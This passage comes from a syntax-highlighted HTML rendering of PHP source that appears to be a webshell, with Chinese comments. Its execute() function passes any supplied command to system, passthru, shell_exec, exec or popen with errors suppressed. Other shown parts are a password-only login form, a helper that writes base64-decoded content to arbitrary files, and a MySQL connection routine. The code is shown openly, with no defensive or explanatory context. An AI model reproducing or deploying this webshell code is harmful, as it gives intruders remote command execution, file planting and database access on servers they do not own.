style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">to<\/span> = $<span style=\"color: #ffcc66;\">curpage<\/span> + <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> - $<span style=\"color: #ffcc66;\">from<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">from<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(($<span style=\"color: #ffcc66;\">to<\/span> - $<span style=\"color: #ffcc66;\">from<\/span>) &lt; $<span style=\"color: #ffcc66;\">page<\/span> &amp;&amp; ($<span style=\"color: #ffcc66;\">to<\/span> - $<span style=\"color: #ffcc66;\">from<\/span>) &lt; $<span style=\"color: #ffcc66;\">pages<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">to<\/span> = $<span style=\"color: #ffcc66;\">page<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>($<span style=\"color: #ffcc66;\">to<\/span> <span style=\"color: #6699cc;\">&gt;<\/span> $<span style=\"color: #ffcc66;\">pages<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">from<\/span> = $<span style=\"color: #ffcc66;\">curpage<\/span> - $<span style=\"color: #ffcc66;\">pages<\/span> + $<span style=\"color: #ffcc66;\">to<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">to<\/span> = $<span style=\"color: #ffcc66;\">pages<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(($<span style=\"color: #ffcc66;\">to<\/span> - $<span style=\"color: #ffcc66;\">from<\/span>) &lt; $<span style=\"color: #ffcc66;\">page<\/span> &amp;&amp; ($<span style=\"color: #ffcc66;\">to<\/span> - $<span style=\"color: #ffcc66;\">from<\/span>) &lt; $<span style=\"color: #ffcc66;\">pages<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">from<\/span> = $<span style=\"color: #ffcc66;\">pages<\/span> - $<span style=\"color: #ffcc66;\">page<\/span> + <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> = ($<span style=\"color: #ffcc66;\">curpage<\/span> - $<span style=\"color: #ffcc66;\">offset<\/span> <span style=\"color: #6699cc;\">&gt;<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">pages<\/span> &gt; $<span style=\"color: #ffcc66;\">page<\/span> ? <span style=\"color: #66cccc;\">'&lt;a href=\"javas<\/span><span style=\"color: #66cccc; text-decoration: underline;\">cript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'\\', 1);\"&gt;First&lt;\/a&gt; '<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">curpage<\/span><span style=\"text-decoration: underline;\"> &gt; <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\"> ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'\\', '<\/span><span style=\"text-decoration: underline;\">.($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">curpage<\/span><span style=\"text-decoration: underline;\"> - <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">');\"&gt;Prev&lt;\/a&gt; '<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span> = $<span style=\"color: #ffcc66;\">from<\/span>; $<span style=\"color: #ffcc66;\">i<\/span> &lt;= $<span style=\"color: #ffcc66;\">to<\/span>; $<span style=\"color: #ffcc66;\">i<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> .= $<span style=\"color: #ffcc66;\">i<\/span> == $<span style=\"color: #ffcc66;\">curpage<\/span> ? $<span style=\"color: #ffcc66;\">i<\/span>.<span style=\"color: #66cccc;\">' '<\/span> : <span style=\"color: #66cccc;\">'&lt;a href=\"javascript:settabl<\/span><span style=\"color: #66cccc; text-decoration: underline;\">e(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'\\', '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">i<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">');\"&gt;['<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">i<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">']&lt;\/a&gt; '<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> .= ($<span style=\"color: #ffcc66;\">curpage<\/span> &lt; $<span style=\"color: #ffcc66;\">pages<\/span> ? <span style=\"color: #66cccc;\">'&lt;a href=\"javascript:settable(\\''<\/span>.$<span style=\"color: #ffcc66;\">ta<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">blename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'\\', '<\/span><span style=\"text-decoration: underline;\">.($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">curpage<\/span><span style=\"text-decoration: underline;\"> + <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">');\"&gt;Next&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">to<\/span><span style=\"text-decoration: underline;\"> &lt; $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">pages<\/span><span style=\"text-decoration: underline;\"> ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'\\', '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">pages<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">');\"&gt;Last&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">multipage<\/span> = $<span style=\"color: #ffcc66;\">multipage<\/span> ? <span style=\"color: #66cccc;\">'&lt;p&gt;Pages: '<\/span>.$<span style=\"color: #ffcc66;\">multipage<\/span>.<span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span> : <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">multipage<\/span>;\n}\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#30331;&#38470;&#20837;&#21475;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">loginpage<\/span>() {\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;style<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"text\/css\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">input<\/span> {<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">11<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">Verdana<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">BACKGROUND<\/span>: <span style=\"color: #999999; font-style: italic;\">#FFFFFF;height: 18px;border: 1px solid <\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">#666666;}<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/style&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;form<\/span> <span style=\"color: #6699cc;\">method=<\/span><span style=\"color: #66cccc;\">\"POST\"<\/span> <span style=\"color: #6699cc;\">action=<\/span><span style=\"color: #66cccc;\">\"\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;span<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"font:11px Verdana;\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Password<\/span>: <span style=\"color: #6699cc;\">&lt;\/span&gt;&lt;input<\/span> <span style=\"color: #6699cc;\">name=<\/span><span style=\"color: #66cccc;\">\"password\"<\/span> <span style=\"color: #6699cc;\">typ<\/span><span style=\"color: #6699cc; text-decoration: underline;\">e=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"password\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">size=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"20\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;input<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"hidden\"<\/span> <span style=\"color: #6699cc;\">name=<\/span><span style=\"color: #66cccc;\">\"action\"<\/span> <span style=\"color: #6699cc;\">value=<\/span><span style=\"color: #66cccc;\">\"login\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;input<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"submit\"<\/span> <span style=\"color: #6699cc;\">value=<\/span><span style=\"color: #66cccc;\">\"Login\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/form&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end loginpage()<\/span>\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">execute<\/span>($<span style=\"color: #ffcc66;\">cfe<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">cfe<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'system'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_start(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">system(<\/span>$<span style=\"color: #ffcc66;\">cfe<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_get_contents(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_end_clean(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'passthru'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_start(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">passthru(<\/span>$<span style=\"color: #ffcc66;\">cfe<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_get_contents(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ob_end_clean(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'shell_exec'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">shell_exec(<\/span>$<span style=\"color: #ffcc66;\">cfe<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'exec'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">exec(<\/span>$<span style=\"color: #ffcc66;\">cfe<\/span>,$<span style=\"color: #ffcc66;\">res<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">join(<\/span><span style=\"color: #66cccc;\">\"\\n\"<\/span>,$<span style=\"color: #ffcc66;\">res<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span>(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_resource(<\/span>$<span style=\"color: #ffcc66;\">f<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">popen(<\/span>$<span style=\"color: #ffcc66;\">cfe<\/span>,<span style=\"color: #66cccc;\">\"r\"<\/span>))) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>(!@<span style=\"color: #cccccc; background-color: #2d2d2d;\">feof(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> .= @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fread(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">1024<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">pclose(<\/span>$<span style=\"color: #ffcc66;\">f<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">res<\/span>;\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">which<\/span>($<span style=\"color: #ffcc66;\">pr<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">path<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">\"which $pr\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> ($<span style=\"color: #ffcc66;\">path<\/span> ? $<span style=\"color: #ffcc66;\">path<\/span> : $<span style=\"color: #ffcc66;\">pr<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n}\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">cf<\/span>($<span style=\"color: #ffcc66;\">fname<\/span>,$<span style=\"color: #ffcc66;\">text<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">fp<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">fname<\/span>,<span style=\"color: #66cccc;\">'w'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fputs(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,@<span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(<\/span>$<span style=\"color: #ffcc66;\">text<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">dirsize<\/span>($<span style=\"color: #ffcc66;\">dir<\/span>) {<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dh<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">opendir(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">size<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">file<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">readdir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">file<\/span> != <span style=\"color: #66cccc;\">'.'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">file<\/span> != <span style=\"color: #66cccc;\">'..'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">path<\/span> = $<span style=\"color: #ffcc66;\">dir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>.$<span style=\"color: #ffcc66;\">file<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">size<\/span> += @<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">path<\/span>) ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">dirsize(<\/span>$<span style=\"color: #ffcc66;\">path<\/span>) : @<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">path<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">closedir(<\/span>$<span style=\"color: #ffcc66;\">dh<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> $<span style=\"color: #ffcc66;\">size<\/span>;\n}\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">debuginfo<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">starttime<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mtime<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">' '<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">microtime(<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">totaltime<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">number_format(<\/span>($<span style=\"color: #ffcc66;\">mtime<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>] + $<span style=\"color: #ffcc66;\">mtime<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>] - $<span style=\"color: #ffcc66;\">starttime<\/span>), <span style=\"color: #cccccc; background-color: #2d2d2d;\">6<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">'Processed in '<\/span>.$<span style=\"color: #ffcc66;\">totaltime<\/span>.<span style=\"color: #66cccc;\">' second(s)'<\/span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">mydbconn<\/span>($<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>=<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>=<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">dbport<\/span>=<span style=\"color: #66cccc;\">'3306'<\/span>)<span style=\"text-decoration: underline;\"> {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">global<\/span> $<span style=\"color: #ffcc66;\">charsetdb<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">ini_set(<\/span><span style=\"color: #66cccc;\">'mysql.connect_timeout'<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #ffcc66;\">link<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_connect(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>.<span style=\"color: #66cccc;\">':'<\/span>.$<span style=\"color: #ffcc66;\">dbport<\/span>, $<span style=\"color: #ffcc66;\">dbuser<\/span>, $<span style=\"color: #ffcc66;\">dbpass<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Can not connect to MySQL server&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">link<\/span> &amp;&amp; $<span style=\"color: 